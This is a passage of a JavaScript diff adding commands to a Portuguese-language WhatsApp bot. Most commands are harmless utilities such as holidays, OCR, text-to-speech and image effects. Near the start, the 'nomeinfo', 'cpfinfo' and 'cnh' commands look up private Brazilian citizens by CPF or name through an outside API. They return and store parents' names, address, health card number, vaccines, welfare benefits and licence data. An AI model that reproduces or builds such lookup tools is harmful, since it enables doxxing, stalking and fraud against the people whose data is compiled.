+            txt += `🆔 CPF: ${p.cpf?.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4') || "N/I"}\n`;
+            txt += `🎂 Nasc: ${p.nasc || "N/I"}\n`;
+            txt += `💍 Civil: ${p.estadocivil || "N/I"}\n`;
+            txt += `👩 Mãe: ${p.nomemae || "N/I"}\n\n`;
+        });
+
+        txt += `GzeeScriptsDev</>
+
+╰━━━━━━━━━━━━━━⬣`;
+
+        // Salvar em consultas.json
+        const consultas = fs.existsSync('/storage/emulated/0/Zyron-MD❤️‍🔥/Zyron-MD/DATABASE2/SCRAPERS/consultas.json') ? JSON.parse(fs.readFileSync('/storage/emulated/0/Zyron-MD❤️‍🔥/Zyron-MD/DATABASE2/SCRAPERS/consultas.json')) : [];
+        consultas.push({
+            tipo: 'NOME',
+            data: new Date().toISOString(),
+            nomeBuscado: q.trim().toUpperCase(),
+            total: total,
+            resultados: resultados,
+            dados: data
+        });
+        fs.writeFileSync('/storage/emulated/0/Zyron-MD❤️‍🔥/Zyron-MD/DATABASE2/SCRAPERS/consultas.json', JSON.stringify(consultas, null, 2));
+
+        await conn.sendMessage(from, {
+            text: txt,
+            buttons: [
+                {
+                    buttonId: `${prefix}nomeinfo ${q}`,
+                    buttonText: { displayText: "🔄 Consultar novamente" },
+                    type: 1
+                },
+                {
+                    buttonId: `${prefix}menu`,
+                    buttonText: { displayText: "📋 Menu" },
+                    type: 1
+                }
+            ],
+            headerType: 1
+        }, {
+            quoted: info
+        });
+
+    } catch (e) {
+        console.log("[ERRO NOME]", e?.response?.data || e.message);
+        reply("❌ Erro ao consultar por nome.");
+    }
+}
+break;
+
+const CONSULTAS_FILE = path.join(__dirname, '/storage/emulated/0/Zyron-MD❤️‍🔥/Zyron-MD/DATABASE2/SCRAPERS/consultas.json');
+
+function carregarConsultas() {
+    if (!fs.existsSync(CONSULTAS_FILE)) {
+        fs.writeFileSync(CONSULTAS_FILE, JSON.stringify([], null, 2));
+        return [];
+    }
+    return JSON.parse(fs.readFileSync(CONSULTAS_FILE, 'utf8'));
+}
+
+function salvarConsulta(dados) {
+    const consultas = carregarConsultas();
+    consultas.push({
+        timestamp: new Date().toISOString(),
+        ...dados
+    });
+    fs.writeFileSync(CONSULTAS_FILE, JSON.stringify(consultas, null, 2));
+}
+
+// Validação de CPF
+function validarCPF(cpf) {
+    cpf = cpf.replace(/[^\d]/g, '');
+    
+    if (cpf.length !== 11) return false;
+    if (/^(\d)\1{10}$/.test(cpf)) return false;
+    
+    let soma = 0;
+    for (let i = 1; i <= 9; i++) {
+        soma += parseInt(cpf.substring(i - 1, i)) * (11 - i);
+    }
+    let resto = (soma * 10) % 11;
+    if (resto === 10 || resto === 11) resto = 0;
+    if (resto !== parseInt(cpf.substring(9, 10))) return false;
+    
+    soma = 0;
+    for (let i = 1; i <= 10; i++) {
+        soma += parseInt(cpf.substring(i - 1, i)) * (12 - i);
+    }
+    resto = (soma * 10) % 11;
+    if (resto === 10 || resto === 11) resto = 0;
+    
+    return resto === parseInt(cpf.substring(10, 11));
+}
+
+case 'cpfinfo': {
+    try {
+        const axios = require("axios");
+        
+        if (!So_Dono) return reply('Apenas o dono pode usar esse comando manin.');
+        if (!q) return reply(`🔍 *CONSULTA CPF*
+
+Use:
+${prefix + command} CPF
+
+Exemplo:
+${prefix + command} 99999999999`);
+
+        await reagir(from, "🔎");
+
+        const { data } = await axios.get(
+            `https://zone.api.br/api/consultas/cpf?apikey=API_KEY_SYSTEM&cpf=${q.replace(/\D/g, '')}`,
+            { timeout: 30000 }
+        );
+
+        if (!data.status || !data.result) {
+            return reply("❌ CPF não encontrado.");
+        }
+
+        const r = data.result;
+        const pessoal = r.filiacao?.[0] || {};
+        const bio = r.biometria?.[0] || {};
+        const end = r.enderecos?.[0] || {};
+        
+        // Benefícios
+        const benefs = [];
+        if (r.auxiliobrasil?.length) benefs.push("• Auxílio Brasil");
+        if (r.auxilioemergencial?.length) benefs.push("• Auxílio Emergencial");
+        if (r.bolsafamilia?.length) benefs.push("• Bolsa Família");
+        if (r.auxiliobpc?.length) benefs.push("• BPC");
+        if (r.histinss?.length) benefs.push("• INSS");
+        
+        // Vacinas (primeiras 2)
+        const vacinas = r.vacinas?.slice(0, 2).map(v => 
+            `• ${v.vacinanome} (${v.descricaodose})`
+        ).join("\n") || "Nenhuma";
+
+        let txt = `╭━━〔 🔍 𝗖𝗢𝗡𝗦𝗨𝗟𝗧𝗔 𝗖𝗣𝗙 〕━━⬣
+
+👤 *Nome:* ${pessoal.nome || "Não informado"}
+
+🆔 *CPF:* ${q.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4')}
+
+🎂 *Nascimento:* ${bio.datanasc || "Não informado"}
+
+⚧ *Sexo:* ${bio.sexo === '1' ? 'Masculino' : bio.sexo === '2' ? 'Feminino' : 'N/I'}
+
+💍 *Estado Civil:* ${bio.estcivil || "Não informado"}
+
+👩 *Mãe:* ${pessoal.nomemae || "Não informado"}
+
+👨 *Pai:* ${pessoal.nomepai || "Não informado"}
+
+📚 *Escolaridade:* ${bio.escolaridade || "Não informado"}
+
+🏥 *CNS:* ${r.cnshistorico?.[0]?.cns || "Não informado"}
+
+💉 *Vacinas:* 
+${vacinas}
+
+💰 *Benefícios:* 
+${benefs.length ? benefs.join("\n") : "Nenhum"}
+
+📍 *Endereço:*
+${end.logradouro || "N/I"}, ${end.numero || "N/I"}
+${end.bairro || "N/I"} - ${end.cidade || "N/I"}/${end.siglauf || "N/I"}
+CEP: ${end.cep || "N/I"}
+
+👑 *Criador* GzeeScriptsDev</>
+
+╰━━━━━━━━━━━━━━⬣`;
+
+        // Salvar em consultas.json
+        const consultas = fs.existsSync('./consultas.json') ? JSON.parse(fs.readFileSync('./consultas.json')) : [];
+        consultas.push({
+            tipo: 'CPF',
+            data: new Date().toISOString(),
+            cpf: q.replace(/\D/g, ''),
+            nome: pessoal.nome,
+            dados: data
+        });
+        fs.writeFileSync('./consultas.json', JSON.stringify(consultas, null, 2));
+
+        await conn.sendMessage(from, {
+            text: txt,
+            buttons: [
+                {
+                    buttonId: `${prefix}cpfinfo ${q}`,
+                    buttonText: { displayText: "🔄 Consultar novamente" },
+                    type: 1
+                },
+                {
+                    buttonId: `${prefix}menu`,
+                    buttonText: { displayText: "📋 Menu" },
+                    type: 1
+                }
+            ],
+            headerType: 1
+        }, {
+            quoted: info
+        });
+
+    } catch (e) {
+        console.log("[ERRO CPF]", e?.response?.data || e.message);
+        reply("❌ Erro ao consultar CPF.");
+    }
+}
+break;
+
+case 'cnh': {
+try {
+
+const axios = require("axios");
+
+if (!So_Dono) return reply('Apenas o dono pode usar esse comando manin.');
+if(!q) return reply(`🪪 *CONSULTA CNH*
+
+Use:
+${prefix + command} CPF
+
+Exemplo:
+${prefix + command} 00000000000`);
+
+
+await reagir(from,"🔎");
+
+
+const { data } = await axios.get(
+`https://zone.api.br/api/consultas/cnh?apikey=API_KEY_SYSTEM&cpf=${q}`
+);
+
+
+if(!data.status || !data.result){
+return reply("❌ CPF não encontrado.");
+}
+
+
+const r = data.result;
+
+
+let txt = `╭━━〔 🪪 𝗖𝗡𝗛 〕━━⬣
+
+👤 *Nome:* ${r.nome || "Não informado"}
+
+🆔 *CPF:* ${r.cpf || q}
+
+🎂 *Nascimento:* ${r.nasc || "Não informado"}
+
+👩 *Mãe:* ${r.filiacao?.nomemae || "Não informado"}
+
+👨 *Pai:* ${r.filiacao?.nomepai || "Não informado"}
+
+👑 *Criador:* ${data.creator}
+
+╰━━━━━━━━━━━━━━⬣`;
+
+
+await conn.sendMessage(from,{
+text:txt,
+buttons:[
+{
+buttonId:`${prefix}cnh ${q}`,
+buttonText:{
+displayText:"🔄 Consultar novamente"
+},
+type:1
+},
+{
+buttonId:`${prefix}menu`,
+buttonText:{
+displayText:"📋 Menu"
+},
+type:1
+}
+],
+headerType:1
+},{
+quoted:info
+});
+
+
+}catch(e){
+
+console.log("[ERRO CNH]",e?.response?.data || e.message);
+
+reply("❌ Erro ao consultar CNH.");
+
+}
+
+}
+break;
+
+case 'feriados':
+case 'feriado': {
+try {
+
+const axios = require("axios");
+
+await reagir(from,"📅");
+
+
+const { data } = await axios.get(
+"https://zone.api.br/api/consulta/feriados"
+);
+
+
+if(!data.status || !data.feriados){
+return reply("❌ Não consegui consultar os feriados.");
+}
+
+
+let txt = `╭━━〔 📅 𝗙𝗘𝗥𝗜𝗔𝗗𝗢𝗦 ${data.ano} 〕━━⬣\n\n`;
+
+data.feriados.forEach((f, i)=>{
+
+txt += `┃ ${i+1}. 🎉 *${f.name}*\n`;
+txt += `┃ 📆 Data: ${f.date}\n`;
+txt += `┃ 📌 Dia: ${f.weekday}\n`;
+txt += `┃\n`;
+
+});
+
+txt += `👑 Owner: ${data.Owner}\n`;
+txt += `╰━━━━━━━━━━━━━━⬣`;
+
+
+await conn.sendMessage(from,{
+text:txt,
+buttons:[
+{
+buttonId:`${prefix}feriados`,
+buttonText:{
+displayText:"🔄 Atualizar"
+},
+type:1
+},
+{
+buttonId:`${prefix}menu`,
+buttonText:{
+displayText:"📋 Menu"
+},
+type:1
+}
+],
+headerType:1
+},{
+quoted:info
+});
+
+
+}catch(e){
+
+console.log("[ERRO FERIADOS]",e?.response?.data || e.message);
+
+reply("❌ Erro ao consultar feriados.");
+
+}
+
+}
+break;
+
+case 'upscaler':
+case 'melhorarimagem': {
+try {
+
+const axios = require("axios");
+const FormData = require("form-data");
+
+const quoted = m.quoted ? m.quoted : null;
+const mime = quoted ? (quoted.mimetype || quoted.msg?.mimetype || '') : '';
+
+if(!quoted || !mime.includes("image")) {
+return reply(`🖼️ *UPSCALER*
+
+Responda uma imagem com o comando:
+
+${prefix + command}`);
+}
+
+
+await conn.sendMessage(from,{
+react:{
+text:"⏳",
+key:m.key
+}
+});
+
+
+const buffer = await quoted.download();
+
+if(!buffer) throw new Error("Não consegui baixar a imagem.");
+
+
+const form = new FormData();
+
+form.append("image", buffer, {
+filename:"imagem.jpg",
+contentType:"image/jpeg"
+});
+
+
+const { data } = await axios.post(
+"https://zone.api.br/api/upscaler",
+form,
+{
+headers:{
+...form.getHeaders()
+},
+timeout:120000
+}
+);
+
+
+if(!data.status || !data.url){
+throw new Error("Erro ao melhorar imagem.");
+}
+
+
+await conn.sendMessage(from,{
+image:{
+url:data.url
+},
+caption:
+`🖼️ *UPSCALER*
+
+✅ Imagem melhorada com sucesso!
+
+📈 Escala: ${data.scale}}`,
+},{
+quoted:m
+});
+
+
+await conn.sendMessage(from,{
+react:{
+text:"✅",
+key:m.key
+}
+});
+
+
+}catch(e){
+
+console.log("[ERRO UPSCALER]",e?.response?.data || e.message);
+
+await conn.sendMessage(from,{
+react:{
+text:"❌",
+key:m.key
+}
+});
+
+reply("❌ Não consegui melhorar essa imagem.");
+
+}
+
+}
+break;
+
+case 'tts':
+case 'texttospeech': {
+try {
+
+const axios = require("axios");
+
+if(!q) return reply(`🔊 *TEXT TO SPEECH*
+
+Use:
+${prefix + command} modelo|texto
+
+Exemplo:
+${prefix + command} goku|Olá Gzee`);
+
+let modelo = q.split("|")[0];
+let texto = q.split("|").slice(1).join("|");
+
+if(!modelo || !texto)
+return reply(`❌ Formato inválido.
+
+Use:
+${prefix + command} modelo|texto`);
+
+
+await reagir(from,"🔊");
+
+
+const url = `https://zone.api.br/api/tts?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(texto)}&model=${encodeURIComponent(modelo)}`;
+
+const { data } = await axios.get(url);
+
+
+console.log("[RETORNO TTS]", data);
+
+
+if(!data.status){
+
+if(data.modelos_validos){
+return reply(
+`❌ Modelo inválido!
+
+Modelos disponíveis:
+
+${data.modelos_validos.map(v=>`• ${v}`).join("\n")}`
+);
+}
+
+return reply("❌ Erro ao gerar áudio.");
+}
+
+
+const audio = data.download_url || data.audio || data.url || data.result;
+
+
+if(!audio)
+return reply("❌ Áudio não encontrado na resposta da API.");
+
+
+await conn.sendMessage(from,{
+audio:{
+url: audio
+},
+mimetype:"audio/mpeg",
+ptt:true
+},{
+quoted:info
+});
+
+
+}catch(e){
+
+console.log("[ERRO TTS]", e?.response?.data || e.message);
+
+reply("❌ Erro ao gerar voz.");
+
+}
+
+}
+break;
+
+case 'ocr':
+case 'lertexto': {
+try {
+
+const axios = require("axios");
+const FormData = require("form-data");
+
+const quoted = m.quoted ? m.quoted : null;
+const mime = quoted ? (quoted.mimetype || quoted.msg?.mimetype || '') : '';
+
+if(!quoted || !mime.includes("image")) {
+return reply(`🔎 *OCR*
+
+Responda uma imagem com o comando:
+
+${prefix + command}`);
+}
+
+
+await conn.sendMessage(from,{
+react:{
+text:"⏳",
+key:m.key
+}
+});
+
+
+const buffer = await quoted.download();
+
+if(!buffer) throw new Error("Não consegui baixar a imagem.");
+
+
+const form = new FormData();
+
+form.append("image", buffer, {
+filename:"imagem.jpg",
+contentType:"image/jpeg"
+});
+
+
+const { data } = await axios.post(
+"https://zone.api.br/api/ocr?apikey=API_KEY_SYSTEM",
+form,
+{
+headers:{
+...form.getHeaders()
+},
+timeout:60000
+}
+);
+
+
+if(!data.status || !data.resultado){
+return reply("❌ Não foi possível reconhecer o texto.");
+}
+
+
+const r = data.resultado;
+
+
+await conn.sendMessage(from,{
+text:
+`╭━━〔 🔎 𝗢𝗖𝗥 〕━━⬣
+
+📝 *Texto encontrado:*
+${r.texto || "Nenhum"}
+
+🌐 *Idioma:* ${r.idioma || "Desconhecido"}
+
+📊 *Detalhes:*
+• Linhas: ${r.detalhes?.linhas || 0}
+• Caracteres: ${r.detalhes?.caracteres || 0}
+
+👑 *Owner:* ${data.owner}
+
+╰━━━━━━━━━━━━━━⬣`,
+buttons:[
+{
+buttonId:`${prefix}ocr`,
+buttonText:{
+displayText:"🔄 Ler outra"
+},
+type:1
+},
+{
+buttonId:`${prefix}menu`,
+buttonText:{
+displayText:"📋 Menu"
+},
+type:1
+}
+],
+headerType:1
+},{
+quoted:m
+});
+
+
+await conn.sendMessage(from,{
+react:{
+text:"✅",
+key:m.key
+}
+});
+
+
+}catch(e){
+
+console.log("[ERRO OCR]",e?.response?.data || e.message);
+
+await conn.sendMessage(from,{
+react:{
+text:"❌",
+key:m.key
+}
+});
+
+reply("❌ Erro ao reconhecer texto da imagem.");
+
+}
+
+}
+break;
+
+case 'nsfwcheck':
+case 'verificarimagem': {
+try {
+
+const axios = require("axios");
+
+const url = q;
+
+if(!url || !url.startsWith("http")) {
+return reply(`🔎 *NSFW CHECK*
+
+Use:
+${prefix + command} link_da_imagem
+
+Exemplo:
+${prefix + command} https://site.com/imagem.jpg`);
+}
+
+
+await reagir(from,"🔎");
+
+
+const { data } = await axios.get(
+`https://zone.api.br/api/nsfwcheck?url=${encodeURIComponent(url)}`
+);
+
+
+if(!data.status || !data.result){
+return reply("❌ Não foi possível analisar a imagem.");
+}
+
+
+const r = data.result;
+
+let resultado;
+
+if(r.labelName?.toLowerCase().includes("porn")){
+resultado = "🔞 Conteúdo NSFW detectado";
+}else{
+resultado = "✅ Conteúdo seguro";
+}
+
+
+await conn.sendMessage(from,{
+text:
+`╭━━〔 🔎 𝗡𝗦𝗙𝗪 𝗖𝗛𝗘𝗖𝗞 〕━━⬣
+
+🌐 *Imagem:*
+${data.input_url}
+
+📌 *Resultado:*
 ${resultado}
 
-🤖 Zyron AI
-`.trim());
+🏷️ *Label:* ${r.labelName}
+📊 *Confiança:* ${(r.confidence * 100).toFixed(2)}%
+
+👑 *Owner:* ${data.Owner}
+
+╰━━━━━━━━━━━━━━⬣`,
+buttons:[
+{
+buttonId:`${prefix}nsfwcheck ${url}`,
+buttonText:{
+displayText:"🔄 Verificar novamente"
+},
+type:1
+},
+{
+buttonId:`${prefix}menu`,
+buttonText:{
+displayText:"📋 Menu"
+},
+type:1
+}
+],
+headerType:1
+},{
+quoted:info
+});
+
+
+}catch(e){
+
+console.log("[ERRO NSFW CHECK]",e?.response?.data || e.message);
+
+reply("❌ Erro ao verificar imagem.");
+
+}
+
+}
+break;
+
+case 'moises':
+case 'separarvoz': {
+try {
+
+const axios = require("axios");
+const FormData = require("form-data");
+
+const quoted = m.quoted ? m.quoted : null;
+const mime = quoted ? (quoted.mimetype || quoted.msg?.mimetype || '') : '';
+
+if(!quoted || !mime.includes("audio")) {
+return reply(`🎵 *MOISES AI*
+
+Responda um áudio com o comando:
+
+${prefix + command}`);
+}
+
+
+await conn.sendMessage(from,{
+react:{
+text:"⏳",
+key:m.key
+}
+});
+
+
+const buffer = await quoted.download();
+
+if(!buffer) throw new Error("Falha ao baixar áudio.");
+
+
+const form = new FormData();
+
+form.append("audio", buffer, {
+filename:"audio.mp3",
+contentType:"audio/mpeg"
+});
+
+
+const { data } = await axios.post(
+"https://zone.api.br/api/v1/audio/moises",
+form,
+{
+headers:{
+...form.getHeaders()
+},
+timeout:120000
+}
+);
+
+
+if(!data.status || !data.results){
+throw new Error("Erro na separação.");
+}
+
+
+let r = data.results;
+
+
+await conn.sendMessage(from,{
+text:
+`🎵 *MOISES AI*
+
+✅ Áudio separado com sucesso!
+
+⏳ ${data.message}
+
+Escolha uma faixa:`,
+buttons:[
+{
+buttonId:`${prefix}moises`,
+buttonText:{
+displayText:"🔄 Separar outro"
+},
+type:1
+},
+{
+buttonId:`${prefix}menu`,
+buttonText:{
+displayText:"📋 Menu"
+},
+type:1
+}
+],
+headerType:1
+},{
+quoted:m
+});
+
+
+await conn.sendMessage(from,{
+audio:{
+url:r.vocals
+},
+mimetype:"audio/mpeg",
+fileName:"vocals.mp3"
+},{
+quoted:m
+});
+
+
+await conn.sendMessage(from,{
+audio:{
+url:r.bass
+},
+mimetype:"audio/mpeg",
+fileName:"bass.mp3"
+},{
+quoted:m
+});
+
+
+await conn.sendMessage(from,{
+audio:{
+url:r.drums
+},
+mimetype:"audio/mpeg",
+fileName:"drums.mp3"
+},{
+quoted:m
+});
+
+
+await conn.sendMessage(from,{
+audio:{
+url:r.other
+},
+mimetype:"audio/mpeg",
+fileName:"other.mp3"
+},{
+quoted:m
+});
+
+
+await conn.sendMessage(from,{
+react:{
+text:"✅",
+key:m.key
+}
+});
+
+
+}catch(e){
+
+console.log("[ERRO MOISES]",e?.response?.data || e.message);
+
+await conn.sendMessage(from,{
+react:{
+text:"❌",
+key:m.key
+}
+});
+
+reply("❌ Não consegui separar esse áudio.");
+
+}
+
+}
+break;
+
+case 'fato':
+case 'fatos':
+case 'fatosdesconhecidos': {
+try {
+
+const axios = require("axios");
+
+await reagir(from,"🧠");
+
+const { data } = await axios.get(
+"https://zone.api.br/api/fatosdesconhecidos"
+);
+
+if (!data || !data.status) {
+return reply("❌ Não consegui buscar um fato.");
+}
+
+
+let texto = data.fato || data.mensagem || data.result || JSON.stringify(data);
+
+
+await conn.sendMessage(from,{
+text:
+`╭━━〔 🧠 𝗙𝗔𝗧𝗢𝗦 𝗗𝗘𝗦𝗖𝗢𝗡𝗛𝗘𝗖𝗜𝗗𝗢𝗦 〕━━⬣
+
+${texto}
+
+╰━━━━━━━━━━━━━━⬣`,
+buttons:[
+{
+buttonId:`${prefix}fato`,
+buttonText:{
+displayText:"🔄 Outro fato"
+},
+type:1
+},
+{
+buttonId:`${prefix}menu`,
+buttonText:{
+displayText:"📋 Menu"
+},
+type:1
+}
+],
+headerType:1
+},{
+quoted:info
+});
+
+
+}catch(e){
+console.log("[ERRO FATOS]",e);
+reply("❌ Erro ao buscar fatos.");
+}
+
+}
+break;
+
+case 'removebg':
+case 'tirarfundo': {
+try {
+
+const axios = require("axios");
+const FormData = require("form-data");
+
+const quoted = m.quoted ? m.quoted : null;
+const mime = quoted ? (quoted.mimetype || quoted.msg?.mimetype || '') : '';
+
+if (!quoted || !mime.includes("image")) {
+return reply(`🖼️ *REMOVE BG*
+
+Responda uma imagem com o comando:
+
+${prefix + command}`);
+}
+
+await conn.sendMessage(from,{
+react:{
+text:"⏳",
+key:m.key
+}
+});
+
+
+const buffer = await quoted.download();
+
+if(!buffer) throw new Error("Não consegui baixar a imagem.");
+
+
+const form = new FormData();
+
+form.append("image", buffer, {
+filename:"imagem.jpg",
+contentType:"image/jpeg"
+});
+
+
+const { data } = await axios.post(
+"https://zone.api.br/api/removebg",
+form,
+{
+headers:{
+...form.getHeaders()
+},
+timeout:60000
+}
+);
+
+
+if(!data.status || !data.imagem){
+throw new Error("Erro ao remover fundo.");
+}
+
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`🖼️ *REMOVE BG*
+
+✅ Fundo removido com sucesso!
+
+👑 Criador: ${data.owner}
+
+⏳ Disponível por 2 minutos.`
+},{
+quoted:m
+});
+
+
+await conn.sendMessage(from,{
+react:{
+text:"✅",
+key:m.key
+}
+});
+
+
+}catch(e){
+
+console.log("[ERRO REMOVE BG]",e?.response?.data || e.message);
+
+await conn.sendMessage(from,{
+react:{
+text:"❌",
+key:m.key
+}
+});
+
+reply("❌ Não consegui remover o fundo da imagem.");
+
+}
+
+}
+break;
+
+case 'typographymultiplelayers':
+case 'ephototypographymultiplelayers': {
+try {
+
+if (!q) return reply(`📝 *EPHOTO TYPOGRAPHY MULTIPLE LAYERS*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+const axios = require("axios");
+
+await reagir(from, "📝");
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/typographymultiplelayers?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+if (!data.status)
+return reply("❌ Erro ao gerar imagem.");
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`📝 *EPHOTO TYPOGRAPHY MULTIPLE LAYERS*
+
+✏️ Texto: ${q}`,
+},{
+quoted:info
+});
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Typography Multiple Layers.");
+}
+
+}
+break;
+
+case 'typographypavement':
+case 'ephototypographypavement': {
+try {
+
+if (!q) return reply(`🛣️ *EPHOTO TYPOGRAPHY PAVEMENT*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+const axios = require("axios");
+
+await reagir(from, "🛣️");
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/typographypavement?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+if (!data.status)
+return reply("❌ Erro ao gerar imagem.");
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`🛣️ *EPHOTO TYPOGRAPHY PAVEMENT*
+
+✏️ Texto: ${q}`,
+},{
+quoted:info
+});
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Typography Pavement.");
+}
+
+}
+break;
+
+case 'thor':
+case 'ephotothor': {
+try {
+
+if (!q) return reply(`⚡ *EPHOTO THOR*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+const axios = require("axios");
+
+await reagir(from, "⚡");
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/thor?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+if (!data.status)
+return reply("❌ Erro ao gerar imagem.");
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`⚡ *EPHOTO THOR*
+
+✏️ Texto: ${q}`,
+},{
+quoted:info
+});
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Thor.");
+}
+
+}
+break;
+
+case 'textonwetglass':
+case 'ephototextonwetglass': {
+try {
+
+if (!q) return reply(`💧 *EPHOTO TEXT ON WET GLASS*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+const axios = require("axios");
+
+await reagir(from, "💧");
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/textonwetglass?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+if (!data.status)
+return reply("❌ Erro ao gerar imagem.");
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`💧 *EPHOTO TEXT ON WET GLASS*
+
+✏️ Texto: ${q}
+}`,
+},{
+quoted:info
+});
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Text On Wet Glass.");
+}
+
+}
+break;
+
+case 'silver3d':
+case 'ephotosilver3d': {
+try {
+
+if (!q) return reply(`🥈 *EPHOTO SILVER 3D*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+const axios = require("axios");
+
+await reagir(from, "🥈");
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/silver3d?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+if (!data.status)
+return reply("❌ Erro ao gerar imagem.");
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`🥈 *EPHOTO SILVER 3D*
+
+✏️ Texto: ${q}`,
+},{
+quoted:info
+});
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Silver 3D.");
+}
+
+}
+break;
+
+case 'pornhub':
+case 'ephotopornhub': {
+try {
+
+if (!q) return reply(`🟧 *EPHOTO PORNHUB*
+
+Use:
+${prefix + command} texto1|texto2
+
+Exemplo:
+${prefix + command} Gzee|MD`);
+
+const axios = require("axios");
+
+await reagir(from, "🟧");
+
+let [text1, text2] = q.split("|");
+
+if (!text1 || !text2)
+return reply(`❌ Use o formato:
+${prefix + command} texto1|texto2`);
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/pornhub?apikey=API_KEY_SYSTEM&text1=${encodeURIComponent(text1)}&text2=${encodeURIComponent(text2)}`
+);
+
+console.log(data);
+
+if (!data.status)
+return reply("❌ Erro ao gerar imagem.");
+
+let img = data.imagem || data.image || data.url;
+
+if (!img)
+return reply("❌ A API não retornou a imagem.");
+
+await conn.sendMessage(from,{
+image:{
+url: img
+},
+caption:
+`🟧 *EPHOTO PORNHUB*
+
+✏️ Texto 1: ${text1}
+✏️ Texto 2: ${text2}`,
+},{
+quoted:info
+});
+
+} catch(e) {
+console.log(e.response?.data || e);
+reply("❌ Erro ao criar Pornhub.");
+}
+
+}
+break;
+
+case 'neonlight':
+case 'ephotoneonlight': {
+try {
+
+if (!q) return reply(`💡 *EPHOTO NEON LIGHT*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+const axios = require("axios");
+
+await reagir(from, "💡");
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/neonlight?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+if (!data.status)
+return reply("❌ Erro ao gerar imagem.");
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`💡 *EPHOTO NEON LIGHT*
+
+✏️ Texto: ${q}`,
+},{
+quoted:info
+});
+
+} catch(e) {
+console.log(e);
+reply("❌ Erro ao criar Neon Light.");
+}
+
+}
+break;
+
+case 'naruto':
+case 'narutoephoto': {
+try {
+
+if (!q) return reply(`🍥 *EPHOTO NARUTO*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+const axios = require("axios");
+
+await reagir(from, "🍥");
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/naruto?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+if (!data.status)
+return reply("❌ Erro ao gerar imagem.");
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`🍥 *EPHOTO NARUTO*
+
+✏️ Texto: ${q}`,
+},{
+quoted:info
+});
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Naruto.");
+}
+
+}
+break;
+
+case 'glitch2':
+case 'ephotoglitch2': {
+try {
+
+if (!q) return reply(`⚡ *EPHOTO GLITCH 2*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+const axios = require("axios");
+
+await reagir(from, "⚡");
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/glitch2?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+if (!data.status)
+return reply("❌ Erro ao gerar imagem.");
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`⚡ *EPHOTO GLITCH 2*
+
+✏️ Texto: ${q}`,
+},{
+quoted:info
+});
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Glitch 2.");
+}
+
+}
+break;
+
+case 'glitch':
+case 'ephotoglitch': {
+try {
+
+if (!q) return reply(`⚡ *EPHOTO GLITCH*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+const axios = require("axios");
+
+await reagir(from, "⚡");
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/glitch?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+if (!data.status)
+return reply("❌ Erro ao gerar imagem.");
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`⚡ *EPHOTO GLITCH*
+
+✏️ Texto: ${q}`,
+},{
+quoted:info
+});
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Glitch.");
+}
+
+}
+break;
+
+case 'pixelglitch':
+case 'ephotopixelglitch': {
+try {
+
+if (!q) return reply(`🟪 *EPHOTO PIXEL GLITCH*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+const axios = require("axios");
+
+await reagir(from, "🟪");
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/pixelglitch?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+if (!data.status)
+return reply("❌ Erro ao gerar imagem.");
+
